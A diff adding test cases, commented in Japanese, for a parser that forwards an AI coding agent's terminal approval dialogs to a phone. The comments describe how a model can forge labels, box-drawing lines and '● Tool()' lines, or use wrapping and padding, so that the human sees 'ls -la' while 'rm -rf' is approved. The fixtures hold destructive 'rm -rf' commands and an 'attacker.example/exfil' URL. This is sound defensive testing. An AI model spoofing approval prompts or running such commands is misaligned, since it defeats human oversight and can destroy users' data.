+  // ラベルが物理行で折り返したフレーム。tool を断定したなら対象も出す(出せないなら出さない)。
+  const wrapped = parseDialog(box([' Bash', ' command', ' rm -rf ~/important']))
+  assertEq('ラベル折り返しで「対象が空の Bash 承認」を作らない', !wrapped || !!wrapped.args, true)
+
+  // 単語 1 語のラベルは AUQ / タブ式の本文にも現れるため、**本文を読めたときだけ**断定する。
+  // ラベルが見えているのに本文を読めないフレームは転送しない(6d)。弱ラベルでも同じで、
+  // 「読めないまま `[Bash]` と確信ありげに出す」形を作らない。
+  assertEq('本文を読めない弱ラベルは転送しない', parseDialog(box([' Delete'])), null)
+  const weakDrawn = parseDialog(box([' Delete', ' rm -rf ~/important']))
+  assertEq('本文が読めれば弱ラベルでも断定する', weakDrawn && weakDrawn.tool, 'Bash')
+
+  // 空行を挟んだ ●Tool 行は「密着」ではない。挟めると表示だけ差し替えられる。
+  const spaced = parseDialog(
+    ['● Bash(ls -la)', '', '', ...box([' Bash command', ' rm -rf ~/important']).split('\n')].join('\n')
+  )
+  assertEq('空行越しの ●Tool 行を継承しない', spaced && spaced.args, 'rm -rf ~/important')
+}
+
+// -------------------------------------------------------
+// 56. 承認枠の **中** に書いた偽の罫線 + 偽ラベルで表示をすり替えられない。
+//     罫線もラベルもモデルがコマンド本文に書ける普通の文字なので、「枠の外を読まない」
+//     だけでは足りない(偽装が枠の中で完結する)。実コマンドが 1 文字も出ずに
+//     `ls -la` だけがスマホに出る状態を実行で再現したため、**曖昧なら転送しない**に倒す。
+// -------------------------------------------------------
+console.log('\n[56] 承認枠の中の偽ラベルで表示をすり替えられない')
+{
+  const REAL = "rm -rf /home/koishi/important; cat <<'EOF2'"
+  const frame = (fakeLabel, fakeArg, cmd = REAL) =>
+    [
+      '────────────────',
+      ' Bash command',
+      ' ' + cmd,
+      ' ────────────────',
+      ' ' + fakeLabel,
+      ' ' + fakeArg,
+      ' EOF2',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+  for (const [lbl, arg] of [
+    ['Bash command', 'ls -la'],
+    ['Read file', 'README.md'],
+    ['Edit', 'x'],
+    ['Grep', 'y'],
+  ]) {
+    const r = parseDialog(frame(lbl, arg))
+    assertEq(
+      `枠内の偽ラベル(${lbl})を採用しない`,
+      r === null || r.args.includes('rm -rf /home/koishi/important'),
+      true
+    )
+  }
+  // 実コマンドだけが違う 2 フレームが同じ identity に潰れない(#Z 再発防止)
+  const a = parseDialog(frame('Bash command', 'ls -la', 'ls'))
+  const b = parseDialog(frame('Bash command', 'ls -la', 'rm -rf /home/koishi/important'))
+  assertEq('別コマンドを再描画と誤認しない', !!(a && b && sameDialogIdentity(a, b)), false)
+
+  // **2 つの偽装の組み合わせ**: 枠を曖昧にして箱を読めなくしたうえで、自作の
+  // `● Tool()` 行から args を埋める。片方ずつのガードでは両方すり抜けた(実行で再現)。
+  const combo = [
+    '● Bash(ls -la)',
+    '  ─',
+    ...frame('Read file', 'README.md').split('\n'),
+  ].join('\n')
+  assertEq('枠が曖昧なら args があっても転送しない', parseDialog(combo), null)
+}
+
+// -------------------------------------------------------
+// 57. 実録画から起こした承認枠(2026-08-01、cols=120、`● Bash(touch …)` の承認)。
+//     これまでのフィクスチャは全て手書きで、実機の枠を verbatim で持つものが 1 つも
+//     無かった。抽出の前提(罫線 → ラベル → 空行 → コマンド → 説明 → 空行 → prompt /
+//     下端の区切り線は無い / `● Tool()` 行との間に `⎿` が入る)を実物で固定する。
+// -------------------------------------------------------
+console.log('\n[57] 実録画から起こした承認枠')
+{
+  const real = [
+    '● Bash(touch /tmp/e2e-single-approval-probe.txt)',
+    '  ⎿  Waiting…',
+    '',
+    '─'.repeat(120),
+    ' Bash command',
+    '',
+    '   touch /tmp/e2e-single-approval-probe.txt',
+    '   Create empty probe file in /tmp',
+    '',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. Yes, and always allow access to tmp/ from this project',
+    '   3. No',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(real)
+  assertEq('実録画の枠を読める', r && r.tool, 'Bash')
+  assertEq(
+    'コマンドと説明を連結して出す(隠すより多く見せる)',
+    r && r.args,
+    'touch /tmp/e2e-single-approval-probe.txt Create empty probe file in /tmp'
+  )
+  assertEq('options は 3 つ', r && r.options.length, 3)
+  // `● Bash(...)` 行と枠の間に `⎿ Waiting…` が入るので密着せず、箱の中身が使われる。
+  assertEq('●Tool 行は密着していない(箱の中身が権威)', findLastToolLine(real).readable, true)
+}
+
+// -------------------------------------------------------
+// 58. 長さと折り返し位置を選ぶだけでガードを迂回できる 2 経路。
+//     ガードの根拠を「窓(固定長の範囲)」に置くと、窓の外へ押し出すだけで外れる。
+// -------------------------------------------------------
+console.log('\n[58] 折り返しで割れた ●Tool 行 / ラベルを窓の外へ押し出すフレーム')
+{
+  // 引用符内の `)` で閉じ、**折り返しの継ぎ目が閉じ括弧の直後**に来ると、残りは次の物理行に
+  // 行くので rest が空 = readable=true、しかもその行が罫線文字で始まるので密着も成立する。
+  // [6u] が固定したのは「残りが同じ行に続く」形だけだった。
+  const cut = [
+    '● Bash(echo "safe)',
+    '─" && rm -rf ~/important)',
+    '────────────────',
+    ' Bash command',
+    ' echo "safe)─" && rm -rf ~/important',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(cut)
+  assertEq('切れた args を採用しない(箱の中身か null)', !r || r.args.includes('rm -rf ~/important'), true)
+
+  // 6d の fail-close が prompt 直上 200 字の窓に依存していると、本文を長くしてラベルを
+  // 窓の外へ押し出すだけで無効化できる(押し出す長さは攻撃者が決められる)。
+  const long = 'rm -rf ~/important # ' + 'A'.repeat(230)
+  const pushed = [
+    '────────────────',
+    ' Bash command',
+    ' ' + long,
+    ' ─────────',
+    ' echo done',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  assertEq('ラベルを窓の外へ押し出しても転送しない', parseDialog(pushed), null)
+}
+
+// -------------------------------------------------------
+// 59. モデルは **桁 0 の正規な `● Tool()` 行を自作できる**。CLI が assistant メッセージの
+//     行頭に `●` を描くので、メッセージを `Bash(ls -la)` で始めるだけでよい。継続行は
+//     2 字下げなので、2 行目に罫線を 1 つ置けば密着判定も通る。
+//     → `● Tool()` 行は箱の中身に優先しない(箱が読めたら箱が権威)。
+// -------------------------------------------------------
+console.log('\n[59] 自作された ●Tool 行は箱の中身に優先しない')
+{
+  const forged = [
+    '● Bash(ls -la)',
+    '  ─',
+    '────────────────',
+    ' Bash command',
+    ' rm -rf /home/koishi/important',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(forged)
+  assertEq('箱に描かれた実コマンドを出す', r && r.args, 'rm -rf /home/koishi/important')
+  assertEq('自作 tool 行の args を採らない', r && /ls -la/.test(r.args), false)
+}
+
+// -------------------------------------------------------
+// 60. ラベルの無い承認枠(BOX_LABELS 外 = WebFetch / MCP 系)。ここでは `● Tool()` 行が
+//     唯一の手掛かりなので、行頭アンカー / 密着 / 括弧の対応 / readable の 4 ガードが
+//     **この経路でだけ**効く。ラベル付きの枠は箱の中身が権威なので、これらのガードを
+//     ラベル付きフィクスチャで固定しても変異が検出されない(実測で確認)。
+// -------------------------------------------------------
+console.log('\n[60] ラベルの無い承認枠: ●Tool 行が唯一の手掛かりになる経路')
+{
+  const box = (head) =>
+    [
+      ...head,
+      '────────────────',
+      '   ページを取得します',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+
+  const ok = parseDialog(box(['● WebFetch(https://example.com/a)']))
+  assertEq('ラベルが無ければ ●Tool 行から読む', ok && ok.tool, 'WebFetch')
+  assertEq('args も ●Tool 行から', ok && ok.args, 'https://example.com/a')
+
+  const midline = parseDialog(box(['● WebFetch(https://evil.example) ; ● Read(README.md)']))
+  assertEq('行途中の ●Read( を採用しない', !midline || !/README/.test(midline.args), true)
+
+  const indented = parseDialog(box(['  ● Read(README.md)']))
+  assertEq('字下げされた ●Tool 行は採用しない', !indented || indented.tool !== 'Read', true)
+
+  const stale = parseDialog(box(['● WebFetch(https://old.example)', '  ⎿  done']))
+  assertEq('出力行を挟んだ ●Tool 行を継承しない', !stale || stale.tool !== 'WebFetch', true)
+
+  // 空行を挟んだ形も密着ではない(モデルは出力の最後に ●Tool 行を書いて空行を空けられる)。
+  const blankGap = parseDialog(box(['● WebFetch(https://old.example)', '']))
+  assertEq('空行を挟んだ ●Tool 行を継承しない', !blankGap || blankGap.tool !== 'WebFetch', true)
+
+  const paren = parseDialog(box(['● WebFetch(https://example.com/a(b)c)']))
+  assertEq('括弧の対応を数える', paren && paren.args, 'https://example.com/a(b)c')
+
+  // 引用符内の `)` で閉じ、折り返しで残りが次行へ行く形。rest が空でも採用しない。
+  const cut = parseDialog(box(['● Bash(echo "safe)', '─" && rm -rf ~/important)']))
+  // `args !== 'echo "safe'` では弱い(空欄の `tool:"Unknown"` が転送される退行を見逃す)。
+  // 読み切れないフレームは転送しないので `null` で固定する。
+  assertEq('引用符内で閉じたフレームは転送しない', cut, null)
+}
+
+// -------------------------------------------------------
+// 61. 「窓」を根拠にした判定は、窓の外へ押し出せば必ず破れる。
+//     6d の 200 字窓を潰したあと、その上位にある segment(prompt 直上 2000 字)で
+//     同じ手が通った(実コマンドを 2000 字より長くすると本物のラベルが窓の外へ出る)。
+//     tool 名の長さも同種で、長い名前 1 つで表示 1 行を埋め尽くせる。
+// -------------------------------------------------------
+console.log('\n[61] 窓の押し出し(segment 2000 字 / tool 名の長さ)')
+{
+  const frame = (padLen) =>
+    [
+      '────────────────',
+      ' Bash command',
+      ' rm -rf ~/important && echo ' + 'A'.repeat(padLen),
+      ' ────────────────',
+      ' Read file',
+      ' README.md',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+  assertEq('短い本文では偽ラベルを採らない(対照)', parseDialog(frame(50)), null)
+  assertEq('本文を 2000 字超にしても偽ラベルを採らない', parseDialog(frame(2100)), null)
+
+  // 長い tool 名で表示 1 行を埋めると、コマンド本文も質問文もスマホから消える。
+  const longTool = '● ' + 'A'.repeat(600) + '(https://attacker.example/exfil)'
+  const box = [
+    longTool,
+    '────────────────',
+    '   ページを取得します',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(box)
+  assertEq('長すぎる tool 名は採用しない', !r || r.tool !== 'A'.repeat(600), true)
+  assertEq('長い tool 名を findLastToolLine が返さない', findLastToolLine(longTool + '\n'), null)
+
+  // 表示側: prompt を切ったときも印を残す(切れたのか元から短いのかを区別できるように)。
+  const cut = buildDescription('proj', 'Bash', 'a'.repeat(470), 'P'.repeat(600))
+  assertEq('prompt を切ったときも印が付く', cut.endsWith('…'), true)
+
+  // 箱経路の正規化は行の両端だけ。行の途中の罫線文字まで空白にすると別コマンドが同一視される。
+  const bx = (cmd) =>
+    ['────────────────', ' Bash command', ` ${cmd}`, ' Do you want to proceed?', ' ❯ 1. Yes', '   2. No', ' Esc to cancel'].join('\n')
+  assertEq('行途中の罫線文字を潰さない', parseDialog(bx('echo a─b')).args, 'echo a─b')
+  assertEq(
+    '潰していたら別コマンドが同一視された',
+    sameDialogIdentity(parseDialog(bx('echo a─b')), parseDialog(bx('echo a b'))),
+    false
+  )
+}
+
+// -------------------------------------------------------
+// 62. 箱の中に罫線だけの行を書くと、本物のラベルとコマンドが枠の外へ押し出され、
+//     密着した自作 `● Tool()` 行が表示を乗っ取る。偽ラベルを書かないので `ambiguous` に
+//     掛からず、args が埋まるので `empty-target` にも掛からない = 単独では塞がっている
+//     ガード 2 つを同時に迂回する形。実機の録画では `● Tool()` 行と罫線の間に
+//     `⎿ Waiting…` が入るため密着せず、この形は攻撃者にしか作れない。
+// -------------------------------------------------------
+console.log('\n[62] 箱の中の偽罫線 + 密着した自作 ●Tool 行(2 つの偽装の組み合わせ)')
+{
+  const REAL = 'rm -rf /home/koishi/important'
+  const GLUE = (name, a) => [`● ${name}(${a})`, '  ─']
+  // 実機の形(test-parse-dialog.js [57] の骨格): 罫線 / ラベル / 空行 / コマンド / 説明
+  const box = ({ head = [], extra = [] } = {}) =>
+    [
+      ...head,
+      '─'.repeat(120),
+      ' Bash command',
+      '',
+      '   ' + REAL,
+      ...extra,
+      '   Remove files',
+      '',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+
+  // 述語は **囮の文字列を当てにしない**。`args === 'ls -la'` のような等値比較にすると、
+  // 囮を `cat README.md` に変えるだけで同じすり替えが起きているのに素通りする(実行で確認)。
+  // 合格 = 「転送しない」か「実コマンドが表示に含まれる」かのどちらか。
+  const ok = (r) => r === null || String(r.args).includes(REAL)
+  assertEq(
+    '偽罫線(─)で枠をずらしても自作 tool 行を採らない',
+    ok(parseDialog(box({ head: GLUE('Bash', 'ls -la'), extra: ['   ─────────────'] }))),
+    true
+  )
+  assertEq(
+    '偽罫線(╌)でも同じ',
+    ok(parseDialog(box({ head: GLUE('Bash', 'ls -la'), extra: ['   ╌╌╌╌╌╌╌╌╌╌╌╌╌'] }))),
+    true
+  )
+  assertEq(
+    '囮の文字列を変えても同じ(述語が囮に依存していないことの対照)',
+    ok(parseDialog(box({ head: GLUE('Bash', 'cat README.md'), extra: ['   ─────────────'] }))),
+    true
+  )
+  assertEq(
+    '下端区切り(╌╌╌╌)でも同じ',
+    ok(
+      parseDialog(
+        [
+          ...GLUE('Bash', 'ls -la'),
+          '─'.repeat(120),
+          ' Bash command',
+          '',
+          '   ' + REAL,
+          '   Remove files',
+          '╌'.repeat(40),
+          '',
+          ' Do you want to proceed?',
+          ' ❯ 1. Yes',
+          '   2. No',
+          ' Esc to cancel',
+        ].join('\n')
+      )
+    ),
+    true
+  )
+  // ツール名ごと偽装できる形(スマホには [Read] README.md と出て rm -rf が承認される)
+  const rd = parseDialog(box({ head: GLUE('Read', 'README.md'), extra: ['   ─────────────'] }))
+  assertEq('ツール名の偽装(Read に見せかける)も通さない', rd === null || rd.tool === 'Bash', true)
+
+  // **過剰阻止しないこと**の対照。ラベル無し枠(WebFetch / MCP 系)は画面に既知ラベル語が
+  // 無ければ従来どおり `● Tool()` 行から読む(ユーザー判断で残置確定した経路)。
+  const nolabel = parseDialog(
+    [
+      ...GLUE('WebFetch', 'https://example.com/a'),
+      '─'.repeat(120),
+      '   https://example.com/a',
+      '',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+  )
+  assertEq('ラベル無し枠は従来どおり転送する(過剰阻止しない)', nolabel && nolabel.tool, 'WebFetch')
+  // 正常な箱は不変
+  assertEq('正常な承認箱は不変', parseDialog(box()).args, `${REAL} Remove files`)
+}
+
+// -------------------------------------------------------
+// [63] W002: 注入認可の prompt 近似一致緩和で、長い共通 prefix + 末尾別語の別承認が
+//       取り違えられる穴(codex 9 周目で発見、実行で再現)。削除のみ部分列へ絞って塞ぐ。
+// -------------------------------------------------------
+console.log('\n[63] W002: 長い共通prefix+末尾別語の注入取り違えを塞ぐ / 文字落ちは救う')
+{
+  const TP = 'proj'
+  const P = 'P'.repeat(600)
+  const mkD = (prompt) => ({ tool: 'Bash', args: 'ls', options: ['Yes', 'No'], prompt })
+  // W002 本体: SAFE で登録 → 画面は同 tool/args/options で末尾だけ DANGEROUS。
+  // 登録側 sentDescription は buildDescription(500 字打ち切りで衝突する)。
+  const reg = mkD(P + ' SAFE')
+  reg.sentDescription = buildDescription(TP, 'Bash', 'ls', reg.prompt)
+  const scr = mkD(P + ' DANGEROUS')
+  assertEq('[63] W002: 末尾別語の別承認は注入不可', dialogStillMatchesForInject(scr, reg, TP), false)
+
+  // 追記型残穴(codex / security が 10 周目で指摘): 500 字超 prompt で末尾に追記(登録 ⊂ 画面)。
+  // クランプ衝突で sentDescription が一致し、置換でないため削除のみ部分列でも通っていた。
+  const longP = 'a'.repeat(500)
+  const regAp = mkD(longP)
+  regAp.sentDescription = buildDescription(TP, 'Bash', 'ls', regAp.prompt)
+  const scrAp = mkD(longP + ' DANGEROUS TAIL')
+  assertEq('[63] 追記型(500字超クランプ衝突)は注入不可', dialogStillMatchesForInject(scrAp, regAp, TP), false)
+
+  // exact のみ化の意図的な副作用: >500 字・相違が 500 字境界より後ろの文字落ちフレーム登録は
+  // 注入せず再登録(reRegisterUninjectableDialog)へ倒す。この領域は「削除のみ(文字落ち)」と
+  // 「追記(別承認)」が原理的に弁別不能なため、可用性より安全を採る(スマホ表示はクランプ域で
+  // 同一 = 摩擦は再提示 1 回、恒久オーファンにはならない)。500 字未満の文字落ちは従来どおり
+  // 後段 sentDescription 照合で false = 変化なし。
+  const X = 'X'.repeat(510)
+  const full = mkD(X + 'create the file')
+  const dropped = mkD(X + 'crete the file') // 'a' が 1 文字落ち(削除のみ)
+  dropped.sentDescription = buildDescription(TP, 'Bash', 'ls', dropped.prompt)
+  assertEq('[63] >500字の文字落ちは注入せず再登録へ(安全優先)', dialogStillMatchesForInject(full, dropped, TP), false)
+
+  // exact: 完全一致は当然通る。
+  const same = mkD(P + ' SAFE')
+  same.sentDescription = buildDescription(TP, 'Bash', 'ls', same.prompt)
+  assertEq('[63] 完全一致は注入可', dialogStillMatchesForInject(mkD(P + ' SAFE'), same, TP), true)
+}
+
+// -------------------------------------------------------
+// [64] 外部契約(M6、codex 合意 2026-08-09): ラベルらしい行が 2 本以上見えるフレームは理由を
+//      問わず転送不能(parseDialog が null)。empty-target / ambiguous-box のどちらで止まるかは
+//      診断用で仕様外 = 契約は「null(転送しない)」。ambiguous-box を消しても empty-target が
+//      代替するため変異 M6 は SURVIVED になるが、外部契約(この null)は保たれる。
+// -------------------------------------------------------
+console.log('\n[64] 外部契約: ラベル 2 本以上のフレームは転送不能(M6)')
+{
+  const twoLabels = [
+    '────────────────────',
+    ' Bash command',
+    ' ls -la',
+    ' Bash command',
+    ' rm -rf /home/koishi/important',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  assertEq('[64] ラベル 2 本フレームは転送不能(null)', parseDialog(twoLabels), null)
 }
 
 // -------------------------------------------------------
